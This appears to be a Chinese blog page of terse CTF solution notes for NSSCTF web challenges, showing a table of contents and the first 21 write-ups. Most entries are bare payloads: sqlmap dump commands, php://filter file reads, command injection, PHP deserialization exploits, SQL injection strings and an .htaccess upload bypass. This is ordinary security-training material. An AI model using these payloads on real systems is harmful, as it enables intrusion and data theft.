href="#120-MoeCTF-2021-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97%E2%80%94%E5%B0%8F%E9%A5%BC%E5%B9%B2"><span class="toc-number">120.</span> <span class="toc-text">120.[MoeCTF 2021]Web安全入门指北—小饼干</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#121-MoeCTF-2022-what-are-y0u-uploading%EF%BC%9F"><span class="toc-number">121.</span> <span class="toc-text">121.[MoeCTF 2022]what are y0u uploading？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#122-MoeCTF-2021-2048"><span class="toc-number">122.</span> <span class="toc-text">122.[MoeCTF 2021]2048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#123-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-upload"><span class="toc-number">123.</span> <span class="toc-text">123.[UUCTF 2022 新生赛]ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#124-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-welcome"><span class="toc-number">124.</span> <span class="toc-text">124.[极客大挑战 2020]welcome</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#125-MoeCTF-2021-babyRCE"><span class="toc-number">125.</span> <span class="toc-text">125.[MoeCTF 2021]babyRCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#126-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-1zpop"><span class="toc-number">126.</span> <span class="toc-text">126.[SWPUCTF 2022 新生赛]ez_1zpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#127-MoeCTF-2022-ezphp"><span class="toc-number">127.</span> <span class="toc-text">127.[MoeCTF 2022]ezphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#128-HZNUCTF-2023-preliminary-flask"><span class="toc-number">128.</span> <span class="toc-text">128.[HZNUCTF 2023 preliminary]flask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#129-NCTF-2019-Fake-XML-cookbook"><span class="toc-number">129.</span> <span class="toc-text">129.[NCTF 2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#130-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unser"><span class="toc-number">130.</span> <span class="toc-text">130.[UUCTF 2022 新生赛]ez_unser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#131-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Ez-upload"><span class="toc-number">131.</span> <span class="toc-text">131.[SWPUCTF 2022 新生赛]Ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#132-FSCTF-2023-%E6%BA%90%E7%A0%81%EF%BC%81%E5%90%AF%E5%8A%A8"><span class="toc-number">132.</span> <span class="toc-text">132.[FSCTF 2023]源码！启动!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#133-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-funny-web"><span class="toc-number">133.</span> <span class="toc-text">133.[SWPUCTF 2022 新生赛]funny_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#134-MoeCTF-2021-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97%E2%80%94GET"><span class="toc-number">134.</span> <span class="toc-text">134.[MoeCTF 2021]Web安全入门指北—GET</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#135-MoeCTF-2021-unserialize"><span class="toc-number">135.</span> <span class="toc-text">135.[MoeCTF 2021]unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#136-FSCTF-2023-webshell%E6%98%AF%E5%95%A5%E6%8D%8F"><span class="toc-number">136.</span> <span class="toc-text">136.[FSCTF 2023]webshell是啥捏</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#137-GKCTF-2020-CheckIN"><span class="toc-number">137.</span> <span class="toc-text">137.[GKCTF 2020]CheckIN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#138-CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-number">138.</span> <span class="toc-text">138.[CISCN 2022 初赛]ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#139-NSSRound-7-Team-ec-RCE"><span class="toc-number">139.</span> <span class="toc-text">139.[NSSRound#7 Team]ec_RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#140-GXYCTF-2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">140.</span> <span class="toc-text">140.[GXYCTF 2019]禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#141-MoeCTF-2021-Do-you-know-HTTP"><span class="toc-number">141.</span> <span class="toc-text">141.[MoeCTF 2021]Do you know HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#142-HNCTF-2022-WEEK3-ssssti"><span class="toc-number">142.</span> <span class="toc-text">142.[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#143-FSCTF-2023-%E7%BB%86%E7%8B%972-0"><span class="toc-number">143.</span> <span class="toc-text">143.[FSCTF 2023]细狗2.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#144-HZNUCTF-2023-preliminary-ppppop"><span class="toc-number">144.</span> <span class="toc-text">144.[HZNUCTF 2023 preliminary]ppppop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#145-HNCTF-2022-WEEK2-Canyource"><span class="toc-number">145.</span> <span class="toc-text">145.[HNCTF 2022 WEEK2]Canyource</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#146-WUSTCTF-2020-CV-Maker"><span class="toc-number">146.</span> <span class="toc-text">146.[WUSTCTF 2020]CV Maker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#147-CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret"><span class="toc-number">147.</span> <span class="toc-text">147.[CISCN 2019华东南]Double Secret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#148-NSSRound-8-Basic-MyPage"><span class="toc-number">148.</span> <span class="toc-text">148.[NSSRound#8 Basic]MyPage</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#149-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">149.</span> <span class="toc-text">149.[SWPUCTF 2021 新生赛]babyunser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#150-HDCTF-2023-LoginMaster"><span class="toc-number">150.</span> <span class="toc-text">150.[HDCTF 2023]LoginMaster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#151-FSCTF-2023-EZ-eval"><span class="toc-number">151.</span> <span class="toc-text">151.[FSCTF 2023]EZ_eval</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#152-HZNUCTF-2023-preliminary-guessguessguess"><span class="toc-number">152.</span> <span class="toc-text">152.[HZNUCTF 2023 preliminary]guessguessguess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#153-FSCTF-2023-Hello-you"><span class="toc-number">153.</span> <span class="toc-text">153.[FSCTF 2023]Hello,you</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#154-LitCTF-2023-%E5%BD%A9%E8%9B%8B"><span class="toc-number">154.</span> <span class="toc-text">154.[LitCTF 2023]彩蛋</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#155-GFCTF-2021-Baby-Web"><span class="toc-number">155.</span> <span class="toc-text">155.[GFCTF 2021]Baby_Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#156-NCTF-2018-Flask-PLUS"><span class="toc-number">156.</span> <span class="toc-text">156.[NCTF 2018]Flask PLUS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#157-FSCTF-2023-ez-php1"><span class="toc-number">157.</span> <span class="toc-text">157.[FSCTF 2023]ez_php1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#158-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-number">158.</span> <span class="toc-text">158.[HUBUCTF 2022 新生赛]Calculate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#159-NSSCTF-2022-Spring-Recruit-babysql"><span class="toc-number">159.</span> <span class="toc-text">159.[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#160-NSSRound-13-Basic-flask-jwt"><span class="toc-number">160.</span> <span class="toc-text">160.[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#161-%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable"><span class="toc-number">161.</span> <span class="toc-text">161.[湖湘杯 2021 final]Penetratable</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#162-MoeCTF-2022-Sqlmap-boy"><span class="toc-number">162.</span> <span class="toc-text">162.[MoeCTF 2022]Sqlmap_boy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#163-FSCTF-2023-%E5%B7%B4%E5%B7%B4%E6%89%98%E6%96%AF%EF%BC%81"><span class="toc-number">163.</span> <span class="toc-text">163.[FSCTF 2023]巴巴托斯！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#164-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">164.</span> <span class="toc-text">164.[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#165-HNCTF-2022-WEEK2-easy-unser"><span class="toc-number">165.</span> <span class="toc-text">165.[HNCTF 2022 WEEK2]easy_unser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#166-SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-If-else"><span class="toc-number">166.</span> <span class="toc-text">166.[SWPUCTF 2023 秋季新生赛]If_else</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#167-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">167.</span> <span class="toc-text">167.[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#168-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Blackcat"><span class="toc-number">168.</span> <span class="toc-text">168.[羊城杯 2020]Blackcat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#169-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyphp"><span class="toc-number">169.</span> <span class="toc-text">169.[羊城杯 2020]easyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#170-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezsql"><span class="toc-number">170.</span> <span class="toc-text">170.[HUBUCTF 2022 新生赛]ezsql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#171-SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-RCE-PLUS"><span class="toc-number">171.</span> <span class="toc-text">171.[SWPUCTF 2023 秋季新生赛]RCE-PLUS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-NUSTCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezProtocol"><span class="toc-number">172.</span> <span class="toc-text">172.[NUSTCTF 2022 新生赛]ezProtocol</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#173-SCTF-2021-loginme"><span class="toc-number">173.</span> <span class="toc-text">173.[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#174-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezsql"><span class="toc-number">174.</span> <span class="toc-text">174.[UUCTF 2022 新生赛]ezsql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#175-NSSCTF-2nd-php%E7%AD%BE%E5%88%B0"><span class="toc-number">175.</span> <span class="toc-text">175.[NSSCTF 2nd]php签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#176-NCTF-2018-%E5%B0%8F%E7%BB%BF%E8%8D%89%E4%B9%8B%E6%9C%80%E5%BC%BA%E5%A4%A7%E8%84%91"><span class="toc-number">176.</span> <span class="toc-text">176.[NCTF 2018]小绿草之最强大脑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#177-TQLCTF-2022-simple-bypass"><span class="toc-number">177.</span> <span class="toc-text">177.[TQLCTF 2022]simple_bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#178-October-2019-Twice-SQL-Injection"><span class="toc-number">178.</span> <span class="toc-text">178.[October 2019]Twice SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#179-%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E5%9B%A2%E9%98%9F%E7%BB%84-love-Pokemon"><span class="toc-number">179.</span> <span class="toc-text">179.[广东强网杯 2021 团队组]love_Pokemon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#180-CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web1"><span class="toc-number">180.</span> <span class="toc-text">180.[CISCN 2019华北Day1]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#181-SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-Pingpingping"><span class="toc-number">181.</span> <span class="toc-text">181.[SWPUCTF 2023 秋季新生赛]Pingpingping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#182-CSAWQual-2019-Unagi"><span class="toc-number">182.</span> <span class="toc-text">182.[CSAWQual 2019]Unagi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#183-HNCTF-2022-Week1-Challenge-rce"><span class="toc-number">183.</span> <span class="toc-text">183.[HNCTF 2022 Week1]Challenge__rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#184-SWPU-2018-SimplePHP"><span class="toc-number">184.</span> <span class="toc-text">184.[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#185-HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E"><span class="toc-number">185.</span> <span class="toc-text">185.[HNCTF 2022 WEEK4]pop子和pipi美</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#186-FBCTF-2019-rceservice"><span class="toc-number">186.</span> <span class="toc-text">186.[FBCTF 2019]rceservice</span></a></li></ol>
        
    </div>
</aside>

</header>

        <div id="content" class="content">
            <div id="wrapper" class="wrapper" style="max-width: 1200px">
                <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            NSS刷题记录1-200
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="https://www.ayanagi.fun/2023/12/15/NSS%E5%8E%9F%E5%88%9B%E9%A2%98%E8%A7%A31-200/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-12-15T08:14:00.000Z" itemprop="datePublished">2023-12-15</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag vm"></i>
    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>…</p>
<span id="more"></span>

<h1 id="1-SWPUCTF-2021-新生赛-gift-F12"><a href="#1-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="1.[SWPUCTF 2021 新生赛]gift_F12"></a>1.[SWPUCTF 2021 新生赛]gift_F12</h1><p>F12</p>
<h1 id="2-SWPUCTF-2021-新生赛-jicao"><a href="#2-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="2.[SWPUCTF 2021 新生赛]jicao"></a>2.[SWPUCTF 2021 新生赛]jicao</h1><p>payload:</p>
<p>GET <code>json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code></p>
<p>POST <code>id=wllmNB</code></p>
<h1 id="3-SWPUCTF-2021-新生赛-easy-md5"><a href="#3-SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="3.[SWPUCTF 2021 新生赛]easy_md5"></a>3.[SWPUCTF 2021 新生赛]easy_md5</h1><p>payload:</p>
<p>GET name[]&#x3D;1</p>
<p>POST password[]&#x3D;2</p>
<h1 id="4-SWPUCTF-2021-新生赛-easy-sql"><a href="#4-SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="4.[SWPUCTF 2021 新生赛]easy_sql"></a>4.[SWPUCTF 2021 新生赛]easy_sql</h1><p>?wllm&#x3D;1</p>
<p>sqlmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch --dbs</span><br><span class="line">...</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch -D db_name --tables</span><br><span class="line">...</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch -D db_name -T table_name --columns</span><br><span class="line">...</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --batch -D db_name -T table_name -C column_name --dump</span><br></pre></td></tr></table></figure>

<h1 id="5-SWPUCTF-2021-新生赛-include"><a href="#5-SWPUCTF-2021-新生赛-include" class="headerlink" title="5.[SWPUCTF 2021 新生赛]include"></a>5.[SWPUCTF 2021 新生赛]include</h1><p>payload:</p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h1 id="6-SWPUCTF-2021-新生赛-easyrce"><a href="#6-SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="6.[SWPUCTF 2021 新生赛]easyrce"></a>6.[SWPUCTF 2021 新生赛]easyrce</h1><p>paylpad:</p>
<p>?url&#x3D;system(%27cat%20&#x2F;flllllaaaaaaggggggg%27);</p>
<h1 id="7-SWPUCTF-2021-新生赛-caidao"><a href="#7-SWPUCTF-2021-新生赛-caidao" class="headerlink" title="7.[SWPUCTF 2021 新生赛]caidao"></a>7.[SWPUCTF 2021 新生赛]caidao</h1><p>蚁剑直接连</p>
<h1 id="8-第五空间-2021-WebFTP"><a href="#8-第五空间-2021-WebFTP" class="headerlink" title="8.[第五空间 2021]WebFTP"></a>8.[第五空间 2021]WebFTP</h1><p>admin&#x2F;admin888</p>
<p>进入&#x2F;var&#x2F;www&#x2F;html</p>
<p>&#x2F;phoinfo.php</p>
<h1 id="9-SWPUCTF-2021-新生赛-babyrce"><a href="#9-SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="9.[SWPUCTF 2021 新生赛]babyrce"></a>9.[SWPUCTF 2021 新生赛]babyrce</h1><p>cookie:admin&#x3D;1</p>
<p>&#x2F;rasalghul.php?url&#x3D;cat${IFS}&#x2F;flllllaaaaaaggggggg</p>
<h1 id="10-SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#10-SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="10.[SWPUCTF 2021 新生赛]Do_you_know_http"></a>10.[SWPUCTF 2021 新生赛]Do_you_know_http</h1><p>header:XFF&#x2F;Client-IP:127.0.0.1，抓包发，跟随重定向</p>
<h1 id="11-SWPUCTF-2021-新生赛-ez-unserialize"><a href="#11-SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="11.[SWPUCTF 2021 新生赛]ez_unserialize"></a>11.[SWPUCTF 2021 新生赛]ez_unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd=<span class="string">&quot;ctf&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    <span class="variable">$passwd</span> = <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="12-SWPUCTF-2021-新生赛-easyupload2-0"><a href="#12-SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="12.[SWPUCTF 2021 新生赛]easyupload2.0"></a>12.[SWPUCTF 2021 新生赛]easyupload2.0</h1><p>后缀phtml</p>
<h1 id="13-SWPUCTF-2021-新生赛-easyupload1-0"><a href="#13-SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="13.[SWPUCTF 2021 新生赛]easyupload1.0"></a>13.[SWPUCTF 2021 新生赛]easyupload1.0</h1><p>mine改为image&#x2F;jpeg</p>
<h1 id="14-SWPUCTF-2021-新生赛-no-wakeup"><a href="#14-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="14.[SWPUCTF 2021 新生赛]no_wakeup"></a>14.[SWPUCTF 2021 新生赛]no_wakeup</h1><p>wakeup绕过，只要序列化中成员函数大于实际成员数即可绕过，即在最终序列化串中修改成员数量。</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd=<span class="string">&quot;wllm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HaHaHa</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</span></span><br><span class="line"><span class="comment">//将&quot;HaHaHa&quot;:2改为&quot;HaHaHa&quot;:3</span></span><br></pre></td></tr></table></figure>

<p>传入<code>?p=O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code></p>
<h1 id="15-suctf-2019-EasySQL"><a href="#15-suctf-2019-EasySQL" class="headerlink" title="15.[suctf 2019]EasySQL"></a>15.[suctf 2019]EasySQL</h1><p>payload：*,1</p>
<p>猜测内置查询语句：<code>select $post[&#39;query&#39;]||flag from Flag</code></p>
<p>拼接后：<code>select *,1||flag from Flag</code>即<code>select *,1 from Flag</code></p>
<p>payload2：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，将||的功能从或运算改为字符串拼接</p>
<h1 id="16-ZJCTF-2019-NiZhuanSiWei"><a href="#16-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="16.[ZJCTF 2019]NiZhuanSiWei"></a>16.[ZJCTF 2019]NiZhuanSiWei</h1><p>exp:</p>
<p><code>?text=data://text/plain, welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="17-SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#17-SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="17.[SWPUCTF 2021 新生赛]PseudoProtocols"></a>17.[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p>payload1：<code>?wllm=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload2：<code>?a=data://text/plain,I want flag</code></p>
<h1 id="18-BJDCTF-2020-easy-md5"><a href="#18-BJDCTF-2020-easy-md5" class="headerlink" title="18.[BJDCTF 2020]easy_md5"></a>18.[BJDCTF 2020]easy_md5</h1><p>抓包查看包头hint:select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
<p>payload1：<code>?password=ffifdyop</code></p>
<p>payload2：<code>?a[]=1&amp;b[]=2</code></p>
<p>payload3：<code>POST传param1[]=1&amp;param2[]=2</code></p>
<h1 id="19-NISACTF-2022-easyssrf"><a href="#19-NISACTF-2022-easyssrf" class="headerlink" title="19.[NISACTF 2022]easyssrf"></a>19.[NISACTF 2022]easyssrf</h1><p>payload1：<code>file://fl4g</code>，访问ha1x1ux1u.php</p>
<p>payload2：<code>?file=/flag</code></p>
<h1 id="20-SWPUCTF-2021-新生赛-easyupload3-0"><a href="#20-SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="20.[SWPUCTF 2021 新生赛]easyupload3.0"></a>20.[SWPUCTF 2021 新生赛]easyupload3.0</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.htaccess</span><br><span class="line">SetHandler application/x-httpd-php </span><br></pre></td></tr></table></figure>

<p>再传图片马就行了</p>
<h1 id="21-SWPUCTF-2021-新生赛-error"><a href="#21-SWPUCTF-2021-新生赛-error" class="headerlink" title="21.[SWPUCTF 2021 新生赛]error"></a>21.[SWPUCTF 2021 新生赛]error</h1><p>sqlmap一把梭</p>
